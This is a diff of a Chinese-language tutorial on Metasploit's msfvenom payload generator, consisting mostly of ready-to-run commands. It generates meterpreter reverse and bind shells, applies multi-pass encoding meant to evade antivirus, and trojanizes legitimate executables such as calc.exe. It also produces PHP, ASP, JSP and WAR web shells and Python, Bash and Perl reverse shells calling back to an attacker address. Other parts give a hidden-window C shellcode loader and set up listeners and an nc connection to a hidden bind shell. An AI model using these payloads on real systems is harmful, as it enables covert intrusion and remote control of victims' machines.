@@ -1,10 +1,11 @@
->参考 [metasploit-framework wiki](https://github.com/rapid7/metasploit-framework/wiki) 中的 [How-to-use-msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
-
-
-
 ### 简介
-**msfvenom**是Metasploit框架中独立的payload生成器。
+
+**msfvenom**是Metasploit框架中独立的payload生成器.
 （2015.6.8取代了之前的 `msfpayload` 和 `msfencode`）
+
+* 参考
+  * [metasploit-framework wiki](https://github.com/rapid7/metasploit-framework/wiki) 中的 [How-to-use-msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
+
 
 ### 帮助信息
 
@@ -48,25 +49,25 @@ Options:
 
 * 类型1 生成不经过编码的普通payload（不编码->生成内容固定->直接被杀）
 
-```
-#格式
+```bash
+# 格式
 msfvenom --payload <payload> <payload options> -f <format> -o <path>
-#实例
+# 例子
 msfvenom --payload windows/meterpreter/reverse_tcp -f c -o 1.c
 ```
 
 * 类型2 经过编码器处理后生成payload
 
-```
-#格式
+```bash
+# 格式
 msfvenom --payload <payload> -e <encoder > -i <encoder times> -n <nopsled> -f <format> -o <path>
-#实例
+# 例子
 msfvenom --payload windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o C:\back.exe
 ```
 
 * 类型3 捆绑到正常文件后生成payload（暂未测试是否可加-e参数）
 
-```
+```bash
 Msfvenom --payload windows/meterpreter/reverse_tcp -platform windows -a x86 -x C:\calc.exe -k -f exe -o C:\shell.exe
 ```
 
@@ -110,7 +111,7 @@ Msfvenom --payload windows/meterpreter/reverse_tcp -platform windows -a x86 -x C
 
 
 全部输出格式
-```
+```bash
 msfvenom --list format
 
 Framework Executable Formats [--format <value>]
@@ -186,7 +187,7 @@ Framework Transform Formats [--format <value>]
 
 
 全部archs
-```
+```bash
 msfvenom --list archs
 
 Framework Architectures [--arch <value>]
@@ -225,12 +226,11 @@ Framework Architectures [--arch <value>]
     x86_64
     zarch
 
-
 ```
 
 ### --platform 指定支持的系统
 
-```
+```bash
 msfvenom --list platforms
 
 Framework Platforms [--platform <value>]
@@ -275,14 +275,14 @@ Framework Platforms [--platform <value>]
 	
 可以不使用-a参数来指定架构，直接在--payload中的payload名称中明确指定架构，如：
 
-```
+```bash
 msfvenom --payload linux/x86/exec CMD=/bin/sh
 ```
 
 看到该payload指定了参数CMD的值
 
 查看某个Payload具体需要哪些参数
-```
+```bash
 msfvenom --payload linux/x86/exec --payload-options
 
 # 必需参数的Required为yes
@@ -295,7 +295,7 @@ msfvenom --payload linux/x86/exec --payload-options
 1.使用-b参数 指定需要规避的特殊字符列表
 
 msf会"自动"找一个合适的编码器规避payload中的这些"坏字符"
-```
+```bash
 msfvenom --payload windows/meterpreter/bind_tcp -b '\x00' -f raw
 
 Found 10 compatible encoders
@@ -310,7 +310,7 @@ Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 2.使用-e参数 指定编码器名称encoderName
 
 如
-```
+```bash
 msfvenom --payload windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw -o test.bin
 ```
 
@@ -320,13 +320,13 @@ msfvenom --payload windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw -o 
 3.使用-i参数 指定迭代编码的次数
 
 如 3次迭代编码(迭代编码也许会有规避杀毒软件的作用)
-```
+```bash
 msfvenom --payload windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
 ```
 
 4.综合使用 - 通过管道符号 依次使用"多个编码器" 对输出进行编码
 
-```
+```bash
 msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
 msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \
 msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
@@ -334,7 +334,7 @@ msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.
 
 
 所有的编码器
-```
+```bash
 msfvenom -l encoders
 
 Framework Encoders [--encoder <value>]
@@ -394,7 +394,7 @@ Framework Encoders [--encoder <value>]
 捆绑payload到 模板文件（即 宿主文件， 即 自定义的可执行文件）
 
 如 使用windows下的calc.exe作为模板文件,生成payload：
-```
+```bash
 msfvenom --payload windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
 ```
 
@@ -405,7 +405,7 @@ msfvenom使用的模板文件保存在目录`msf/data/templates`
 注意，在win x64下使用自定义的x64的模板文件（如exe等）创建x64的payload时，输出格式必须要写`-f exe-only`而不能写`-f exe`
 （Please note: If you'd like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only:）
 
-```
+```bash
 msfvenom --payload windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
 ```
 
@@ -416,11 +416,12 @@ msfvenom --payload windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.ex
 ### 编译生成的C文件
 
 ```bash
-#win x86 生成c文件
+# win x86 生成c文件
 msfvenom --payload windows/meterpreter/reverse_tcp lhost=[AttackerIP] lport=4444 -f c -e x86/shikata_ga_nai -i 12 -b '\x00'
+```
 
-
-#vc++6.0 编译（含buf数组的）C代码：
+```c
+# vc++6.0 编译（含buf数组的）C代码：
 #include <stdio.h>
 #pragmacomment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//运行时不显示窗口
 unsignedchar buf[] =
@@ -429,9 +430,10 @@ main()
 {
 ((void(*)(void))&buf)();
 }
+```
 
-
-#VS 编译：
+```c
+# VS 编译
 main()
 
 {
@@ -454,7 +456,7 @@ Platform: Android, BSD, Java, JavaScript, Linux, OSX, NodeJS, PHP, Python, Ruby,
 
 
 操作系统
-```
+```bash
 #win x86
 msfvenom --payload windows/meterpreter/reverse_tcp lhost=[AttackerIP] lport=4444 -f exe -o /tmp/my_payload.exe
 x86下 -p后加: windows/../..
@@ -474,28 +476,30 @@ msfvenom --payload android/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[Att
 
 
 Web语言
-```
-#PHP
+```bash
+# .PHP
 msfvenom --payload php/meterpreter_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 
-#.ASP
+# .ASP
 msfvenom --payload windows/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f asp > shell.asp
 
-#.JSP
+# .JSP
 msfvenom --payload java/jsp_shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw > shell.jsp
 
-#.WAR
+# .WAR
 msfvenom --payload java/jsp_shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f war > shell.war
 ```
 
 
 脚本语言
-```
+```bash
 #Python
 msfvenom --payload cmd/unix/reverse_python LHOST=[AttackerIP] LPORT=[AttackerPort]  -f raw > shell.py
+
 #Bash
 msfvenom --payload cmd/unix/reverse_bash LHOST=[AttackerIP]  LPORT=[AttackerPort]  -f raw > shell.sh
+
 #Perl
 msfvenom --payload cmd/unix/reverse_perl LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw > shell.pl
 ```
@@ -509,7 +513,7 @@ Metasploit to be in a position to receive your incoming shells.
 
 
 启动multihandler进行端口监听-单条命令
-```
+```bash
 # 只打算接受一个shell
 msfconsole -x "use exploits/multi/handler; set lhost [AttackerLocalIP]; set lport [AttackerLocalPort]; set payload windows/meterpreter/reverse_tcp; exploit"
 
@@ -518,13 +522,15 @@ msfconsole -x "use exploits/multi/handler; set lhost [AttackerLocalIP]; set lpor
 ```
 
 启动multihandler进行端口监听-多条命令
-```
+```bash
 use exploit/multi/handler 
 show options
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST [AttackerLocalIP]
+
 #默认4444端口
 set LPORT [AttackerLocalPort]
+
 # 运行以下两条命令 - 可接受多个反弹shell(LPORT端口会一直监听)
 set ExitOnSession false
 exploit -j -z
@@ -1088,4 +1094,23 @@ Framework Payloads (547 total) [--payload <value>]
     windows/x64/vncinject/reverse_tcp_uuid              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)
     windows/x64/vncinject/reverse_winhttp               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winhttp)
     windows/x64/vncinject/reverse_winhttps              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTPS (Windows x64 winhttp)
+```
+
+
+#### 例1 `windows/shell_hidden_bind_tcp`
+
+nc连接msfvenom生成的payload
+
+```bash
+# 主控端（ip：192.168.0.101）
+# 被控端（ip：192.168.0.222）
+
+#主控端 生成payload文件 1.exe
+msfvenom -p windows/shell_hidden_bind_tcp lhost = 192.168.0.101 lport = 8956 -f exe> 1.exe
+
+# 目标主机运行exe之后
+# 主控端 主动发起tcp连接
+nc 192.168.0.222 8956
+
+# 主控端获得目标机系统的访问权限
 ```
